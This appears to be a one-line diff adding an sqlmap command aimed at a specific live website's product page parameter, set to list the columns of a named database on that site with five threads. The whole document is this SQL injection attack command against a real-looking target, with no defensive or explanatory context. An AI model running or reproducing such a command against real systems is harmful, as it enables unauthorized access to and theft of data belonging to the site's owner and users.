@@ -1,0 +1,1 @@
+sqlmap -u www.sentulcity.co.id/product-det1.php?id=58 --columns -D k0879151_sentulcity --threads=5
